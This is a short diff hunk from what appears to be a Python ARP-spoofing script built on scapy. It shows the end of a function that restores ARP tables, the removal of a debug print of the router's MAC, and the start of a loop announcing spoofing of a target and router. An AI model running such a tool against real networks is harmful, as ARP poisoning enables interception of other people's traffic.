@@ -44,7 +44,7 @@ def restore(target_ip, spoof_ip):
     arp_resp = scapy.ARP(op=2, pdst=target_ip, hwdst=dest_mac, psrc=spoof_ip, hwsrc=src_mac)
     scapy.send(arp_resp, verbose=False)
     #print(arp_resp.summary())
-print(get_mac("192.168.0.1"))
+
 try:
     print("[+] spoofing arp on target and router...")
     while True:
